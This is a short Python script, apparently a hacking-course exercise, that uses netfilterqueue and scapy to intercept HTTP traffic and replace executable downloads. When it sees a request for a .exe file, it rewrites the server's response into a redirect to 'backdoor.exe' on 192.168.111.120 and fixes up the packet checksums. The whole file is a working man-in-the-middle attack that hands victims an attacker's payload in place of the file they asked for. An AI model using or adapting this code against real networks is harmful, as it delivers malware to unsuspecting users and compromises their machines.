import netfilterqueue
import scapy.all as scapy

ack_list = []

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        try:
            if scapy_packet[scapy.TCP].dport == 80:
                if ".exe" in str(scapy_packet[scapy.Raw].load):
                    print("[log] exe request")
                    ack_list.append(scapy_packet[scapy.TCP].ack)
                #print("[log] http request")
                #print(scapy_packet.show())
            elif scapy_packet[scapy.TCP].sport == 80:
                if scapy_packet[scapy.TCP].seq in ack_list:
                    print("[log] exe Response")
                    ack_list.remove(scapy_packet[scapy.TCP].seq)
                    scapy_packet[scapy.Raw].load = 'HTTP/1.1 301 Moved Permanently\nLocation: http://192.168.111.120/backdoor.exe\n\n'
                    del scapy_packet[scapy.IP].len
                    del scapy_packet[scapy.IP].chksum
                    del scapy_packet[scapy.TCP].chksum

                    packet.set_payload(bytes(scapy_packet))
                #print(scapy_packet.show())       
        except:
            pass  

    packet.accept()


quene =netfilterqueue.NetfilterQueue()
quene.bind(0,process_packet)
quene.run()